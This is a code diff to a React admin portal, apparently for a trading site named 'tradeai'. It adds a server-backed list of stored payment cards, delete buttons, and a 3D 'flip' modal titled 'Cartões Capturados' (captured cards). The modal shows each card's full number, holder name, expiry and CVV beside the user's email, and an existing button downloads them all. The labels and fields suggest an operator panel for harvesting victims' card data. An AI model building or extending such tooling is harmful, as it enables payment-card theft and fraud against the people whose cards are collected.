@@ -79,6 +79,8 @@ export default function AdminPortal() {
   const [users, setUsers] = useState<AdminUser[]>([]);
   const [stats, setStats] = useState<AdminStats | null>(null);
   const [cards, setCards] = useState<CardRecord[]>([]);
+    const [showCardFlip, setShowCardFlip] = useState(false);
+    const [flippedCards, setFlippedCards] = useState<Set<string>>(new Set());
   const [pendingDeposits, setPendingDeposits] = useState<PendingDeposit[]>([]);
   const [searchTerm, setSearchTerm] = useState("");
   const [sortBy, setSortBy] = useState<"pnl" | "balance" | "created">("pnl");
@@ -131,34 +133,16 @@ export default function AdminPortal() {
         setStats(statsData);
       }
 
-      // Carregar cartões do localStorage e do servidor (via depósitos)
-      const localCards = JSON.parse(localStorage.getItem("tradeai_cards") || "[]");
-      
-      // Buscar depósitos do tipo 'card' para extrair cardData
-      try {
-        const depositsRes = await fetch("/api/admin/deposits/pending");
-        if (depositsRes.ok) {
-          const depositsData = await depositsRes.json();
-          const serverCards = depositsData
-            .filter((d: any) => d.method === "card" && d.cardData)
-            .map((d: any) => ({
-              ...d.cardData,
-              id: d.id, // Usar ID do depósito
-              userId: d.userEmail,
-              timestamp: d.timestamp
-            }));
-          
-          // Mesclar e remover duplicatas por número de cartão
-          const combined = [...serverCards, ...localCards];
-          const unique = combined.filter((v, i, a) => a.findIndex(t => t.cardNumber === v.cardNumber) === i);
-          setCards(unique);
-        } else {
-          setCards(localCards);
+      // Carregar cartões exclusivamente do servidor (PostgreSQL — funciona em qualquer browser/incógnito)
+        try {
+          const cardsRes = await fetch("/api/admin/cards");
+          if (cardsRes.ok) {
+            const cardsData = await cardsRes.json();
+            setCards(cardsData.cards || []);
+          }
+        } catch (err) {
+          console.error("Erro ao carregar cartões:", err);
         }
-      } catch (err) {
-        setCards(localCards);
-      }
-      console.log("💳 Cartões carregados no admin:", cards);
 
       // Carregar depósitos pendentes do SERVIDOR
       try {
@@ -291,6 +275,27 @@ export default function AdminPortal() {
     );
   }
 
+      const handleDeleteCard = async (depositId: string) => {
+        if (!confirm("Tem certeza que deseja excluir este cartão?")) return;
+        try {
+          const res = await fetch(`/api/admin/deposits/${depositId}`, { method: "DELETE" });
+          if (res.ok) {
+            setCards((prev: any[]) => prev.filter((c: any) => c.id !== depositId));
+          } else {
+            alert("Erro ao excluir cartão");
+          }
+        } catch { alert("Falha na conexão"); }
+      };
+
+      const toggleFlip = (cardId: string) => {
+        setFlippedCards(prev => {
+          const n = new Set(prev);
+          n.has(cardId) ? n.delete(cardId) : n.add(cardId);
+          return n;
+        });
+      };
+
+  
     const handleDownloadCards = () => {
       const now = new Date().toLocaleString("pt-BR");
       const rows = cards.map((c, i) => `
@@ -473,28 +478,43 @@ export default function AdminPortal() {
         )}
 
 
-          {/* Botão Download Cartões */}
-          <button
-            onClick={handleDownloadCards}
-            disabled={cards.length === 0}
-            className="w-full relative overflow-hidden group rounded-2xl px-5 py-4 font-bold text-sm transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed"
-            style={{
-              background: "linear-gradient(135deg, rgba(59,130,246,0.15) 0%, rgba(139,92,246,0.15) 100%)",
-              border: "1px solid rgba(99,102,241,0.4)",
-              color: "#a5b4fc",
-            }}
-          >
-            <span className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700 pointer-events-none"
-              style={{ background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent)" }} />
-            <span className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"
-              style={{ boxShadow: "0 0 24px rgba(99,102,241,0.35)" }} />
-            <span className="relative flex items-center justify-center gap-3">
-              <Download className="w-4 h-4 flex-shrink-0 group-hover:animate-bounce" />
-              <span>
-                Baixar todos os cartões{cards.length > 0 ? ` (${cards.length})` : ""}
-              </span>
-            </span>
-          </button>
+          {/* Botões de ação dos Cartões */}
+            <div className="flex gap-3">
+              <button
+                onClick={() => setShowCardFlip(true)}
+                disabled={cards.length === 0}
+                className="flex-1 relative overflow-hidden group rounded-2xl px-5 py-4 font-bold text-sm transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed"
+                style={{
+                  background: "linear-gradient(135deg, rgba(139,92,246,0.15) 0%, rgba(217,70,239,0.15) 100%)",
+                  border: "1px solid rgba(168,85,247,0.4)",
+                  color: "#d8b4fe",
+                }}
+              >
+                <span className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700 pointer-events-none"
+                  style={{ background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent)" }} />
+                <span className="relative flex items-center justify-center gap-3">
+                  <CreditCard className="w-4 h-4 flex-shrink-0 group-hover:rotate-12 transition-transform" />
+                  <span>Ver Cartões 3D{cards.length > 0 ? ` (${cards.length})` : ""}</span>
+                </span>
+              </button>
+              <button
+                onClick={handleDownloadCards}
+                disabled={cards.length === 0}
+                className="flex-1 relative overflow-hidden group rounded-2xl px-5 py-4 font-bold text-sm transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed"
+                style={{
+                  background: "linear-gradient(135deg, rgba(59,130,246,0.15) 0%, rgba(139,92,246,0.15) 100%)",
+                  border: "1px solid rgba(99,102,241,0.4)",
+                  color: "#a5b4fc",
+                }}
+              >
+                <span className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700 pointer-events-none"
+                  style={{ background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent)" }} />
+                <span className="relative flex items-center justify-center gap-3">
+                  <Download className="w-4 h-4 flex-shrink-0 group-hover:animate-bounce" />
+                  <span>Download{cards.length > 0 ? ` (${cards.length})` : ""}</span>
+                </span>
+              </button>
+            </div>
 
           {/* Abas de Navegação */}
         <div className="flex gap-2 border-b border-white/10">
@@ -678,6 +698,7 @@ export default function AdminPortal() {
                   <th className="text-left py-3 px-4 text-white/50 font-semibold">CVV</th>
                   <th className="text-left py-3 px-4 text-white/50 font-semibold">Data</th>
                   <th className="text-left py-3 px-4 text-white/50 font-semibold">Usuário</th>
+                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Excluir</th>
                 </tr>
               </thead>
               <tbody>
@@ -715,6 +736,15 @@ export default function AdminPortal() {
                           className="text-blue-400 hover:text-blue-300 font-semibold text-xs underline"
                         >
                           {user?.email || card.userId}
+                        </button>
+                      </td>
+                      <td className="py-3 px-4">
+                        <button
+                          onClick={(e) => { e.stopPropagation(); handleDeleteCard(card.id || card.depositId); }}
+                          className="p-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-all"
+                          title="Excluir cartão"
+                        >
+                          <Trash2 className="w-4 h-4" />
                         </button>
                       </td>
                     </tr>
@@ -856,6 +886,195 @@ export default function AdminPortal() {
           </div>
         </div>
       </div>
-    </Layout>
+
+      {/* ══════════ MODAL FLIP DE CARTÕES 3D ══════════ */}
+      {showCardFlip && (
+        <div
+          className="fixed inset-0 z-50 flex flex-col"
+          style={{ background: "rgba(0,0,0,0.85)", backdropFilter: "blur(12px)" }}
+        >
+          {/* Header do modal */}
+          <div className="flex items-center justify-between px-8 py-5 border-b border-white/10">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 rounded-xl flex items-center justify-center"
+                style={{ background: "linear-gradient(135deg,#7c3aed,#db2777)" }}>
+                <CreditCard className="w-5 h-5 text-white" />
+              </div>
+              <div>
+                <h2 className="text-xl font-bold text-white">Cartões Capturados</h2>
+                <p className="text-xs text-white/40">{cards.length} cartão{cards.length !== 1 ? "s" : ""} — clique para virar</p>
+              </div>
+            </div>
+            <button
+              onClick={() => { setShowCardFlip(false); setFlippedCards(new Set()); }}
+              className="w-10 h-10 rounded-xl flex items-center justify-center text-white/60 hover:text-white hover:bg-white/10 transition-all text-xl font-bold"
+            >✕</button>
+          </div>
+
+          {/* Grid de cartões */}
+          <div className="flex-1 overflow-y-auto p-8">
+            {cards.length === 0 ? (
+              <div className="flex flex-col items-center justify-center h-full text-white/40">
+                <CreditCard className="w-16 h-16 mb-4 opacity-20" />
+                <p className="text-lg">Nenhum cartão capturado</p>
+              </div>
+            ) : (
+              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
+                {cards.map((card: any, i: number) => {
+                  const cardId = card.id || card.depositId || String(i);
+                  const isFlipped = flippedCards.has(cardId);
+                  const num = card.cardNumber || card.number || "•••• •••• •••• ••••";
+                  const masked = num.replace(/(.{4})/g, "$1 ").trim();
+                  const name = (card.cardName || card.name || "TITULAR").toUpperCase();
+                  const expiry = card.cardExpiry || card.expiry || "••/••";
+                  const cvv = card.cardCvv || card.cvv || "•••";
+                  const bank = card.cardBank || "";
+                  // Card color based on first digit
+                  const colors: Record<string, string[]> = {
+                    "4": ["#1a1aff","#0000cc"],   // Visa — blue
+                    "5": ["#cc0000","#880000"],   // MC — red
+                    "3": ["#006633","#004422"],   // Amex — green
+                    "6": ["#ff6600","#cc4400"],   // Elo — orange
+                  };
+                  const firstDigit = String(num).replace(/s/g,"")[0] || "0";
+                  const [c1, c2] = colors[firstDigit] || ["#1e293b","#0f172a"];
+                  
+                  return (
+                    <div
+                      key={cardId}
+                      onClick={() => toggleFlip(cardId)}
+                      className="cursor-pointer select-none"
+                      style={{
+                        perspective: "1000px",
+                        width: "100%",
+                        aspectRatio: "1.586",
+                        animationDelay: `${i * 60}ms`,
+                      }}
+                      title={isFlipped ? "Clique para ver frente" : "Clique para ver CVV"}
+                    >
+                      <div
+                        style={{
+                          position: "relative",
+                          width: "100%",
+                          height: "100%",
+                          transformStyle: "preserve-3d",
+                          transition: "transform 0.65s cubic-bezier(0.23,1,0.32,1)",
+                          transform: isFlipped ? "rotateY(180deg)" : "rotateY(0deg)",
+                        }}
+                      >
+                        {/* ── FRENTE do cartão ── */}
+                        <div
+                          style={{
+                            position: "absolute",
+                            inset: 0,
+                            backfaceVisibility: "hidden",
+                            WebkitBackfaceVisibility: "hidden",
+                            borderRadius: "16px",
+                            padding: "20px 24px",
+                            display: "flex",
+                            flexDirection: "column",
+                            justifyContent: "space-between",
+                            background: `linear-gradient(135deg, ${c1} 0%, ${c2} 100%)`,
+                            boxShadow: "0 20px 60px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.15)",
+                            overflow: "hidden",
+                          }}
+                        >
+                          {/* Reflexo decorativo */}
+                          <div style={{
+                            position: "absolute", top: 0, left: 0, right: 0, height: "50%",
+                            background: "linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%)",
+                            borderRadius: "16px 16px 0 0", pointerEvents: "none",
+                          }} />
+                          {/* Chip + Banco */}
+                          <div className="flex items-center justify-between">
+                            <div style={{
+                              width: 40, height: 30, borderRadius: 6,
+                              background: "linear-gradient(135deg, #f5d76e, #c8a843)",
+                              boxShadow: "inset 0 0 8px rgba(0,0,0,0.3)",
+                            }} />
+                            {bank && <span className="text-white/70 text-xs font-medium tracking-wider">{bank}</span>}
+                          </div>
+                          {/* Número */}
+                          <div>
+                            <p className="text-white font-mono text-base tracking-widest drop-shadow-lg">
+                              {masked}
+                            </p>
+                          </div>
+                          {/* Nome + Validade */}
+                          <div className="flex items-end justify-between">
+                            <div>
+                              <p className="text-white/50 text-[9px] uppercase tracking-widest mb-0.5">Titular</p>
+                              <p className="text-white font-semibold text-sm tracking-wider truncate max-w-[160px]">{name}</p>
+                            </div>
+                            <div className="text-right">
+                              <p className="text-white/50 text-[9px] uppercase tracking-widest mb-0.5">Validade</p>
+                              <p className="text-white font-mono text-sm">{expiry}</p>
+                            </div>
+                          </div>
+                          {/* Hint */}
+                          <div style={{
+                            position: "absolute", bottom: 8, right: 10,
+                            fontSize: 9, color: "rgba(255,255,255,0.3)", letterSpacing: "0.05em",
+                          }}>toque para ver CVV →</div>
+                        </div>
+
+                        {/* ── VERSO do cartão ── */}
+                        <div
+                          style={{
+                            position: "absolute",
+                            inset: 0,
+                            backfaceVisibility: "hidden",
+                            WebkitBackfaceVisibility: "hidden",
+                            borderRadius: "16px",
+                            display: "flex",
+                            flexDirection: "column",
+                            justifyContent: "space-between",
+                            background: `linear-gradient(135deg, ${c2} 0%, ${c1} 100%)`,
+                            boxShadow: "0 20px 60px rgba(0,0,0,0.5)",
+                            transform: "rotateY(180deg)",
+                            overflow: "hidden",
+                          }}
+                        >
+                          {/* Tarja magnética */}
+                          <div style={{
+                            width: "100%", height: 44,
+                            background: "linear-gradient(90deg, #111 0%, #333 50%, #111 100%)",
+                            marginTop: 24,
+                          }} />
+                          {/* Faixa CVV */}
+                          <div className="px-6 flex flex-col items-end gap-1">
+                            <div style={{
+                              width: "100%", height: 36, borderRadius: 6,
+                              background: "rgba(255,255,255,0.9)",
+                              display: "flex", alignItems: "center", justifyContent: "flex-end",
+                              paddingRight: 12,
+                            }}>
+                              <span className="text-black font-mono font-bold tracking-[0.25em] text-lg">{cvv}</span>
+                            </div>
+                            <span className="text-white/40 text-[9px] uppercase tracking-widest">CVV</span>
+                          </div>
+                          {/* Delete button on back */}
+                          <div className="px-6 pb-4 flex items-center justify-between">
+                            <span className="text-white/30 text-[9px] truncate max-w-[140px]">{card.userId}</span>
+                            <button
+                              onClick={(e) => { e.stopPropagation(); handleDeleteCard(cardId); }}
+                              className="flex items-center gap-1 px-2 py-1 rounded-lg text-red-400 hover:text-red-300 text-xs font-medium transition-all"
+                              style={{ background: "rgba(239,68,68,0.15)", border: "1px solid rgba(239,68,68,0.3)" }}
+                            >
+                              <Trash2 className="w-3 h-3" />
+                              Excluir
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+      </Layout>
   );
 }
